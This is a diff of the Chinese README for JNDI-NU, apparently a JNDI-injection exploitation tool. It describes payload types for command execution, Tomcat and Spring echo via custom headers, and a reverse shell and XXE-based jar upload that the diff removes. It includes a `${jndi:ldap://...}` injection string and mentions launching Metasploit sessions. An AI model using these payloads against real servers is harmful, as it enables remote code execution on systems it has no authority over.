@@ -16,20 +16,11 @@ Usage: java -jar JNDI-NU.jar [options]
 ```
 
 * 目前支持的所有 ```PayloadType``` 为
-    * ```Dnslog```: 用于产生一个```DNS```请求，与 ```DNSLog```平台配合使用，对```Linux/Windows```进行了简单的适配
-    * ```nu1r```: 用于执行命令，如果命令有特殊字符，支持对命令进行 ```Base64编码```后传输
-    * ```ReverseShell```: 用于 ```Linux``` 系统的反弹shell，方便使用
     * ```Bypass```: 用于rmi本地工程类加载，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
-    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami```
+    * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami```
       的方式传递想要执行的命令
     * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot```
       时命令执行结果的回显，通过添加自定义```header``` ```nu1r: whoami``` 的方式传递想要执行的命令
-* ```WebsphereBypass``` 中的 3 个动作：
-    * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
-    * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
-    * ```rce```：加载已上传至目标服务器临时目录的```jar包```
-
-**MSF上线支持**
 
 - 支持tomcatBypass路由直接上线msf：
 
@@ -63,11 +54,11 @@ Usage: java -jar JNDI-NU.jar [options]
 ```
 
 支持自定义路径：
-不指定时默认路径为nu1r，示例中的rlls就是重新指定的路径。
+不指定时默认路径为 `nu1r` ，示例中的 `route` 就是重新指定的路径。
 
 ```
 {{url
-    (${jndi:ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/rlls-bx-obscure)
+    (${jndi:ldap://0.0.0.0:1389/TomcatBypass/JBossServlet/urlr/route-bx-obscure)
 }}
 ```
 
@@ -385,7 +376,7 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 }}
 ```
 
-# 自定义
+# 🐳自定义
 
 + 自定义链子
 
@@ -416,6 +407,10 @@ BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() �
 由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
 
 本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。
+
+# 🦚TODO
+
+GroovyBypass路由与WebsphereBypass路由的具体实现功能还在思考中
 
 # 🐲建议
 
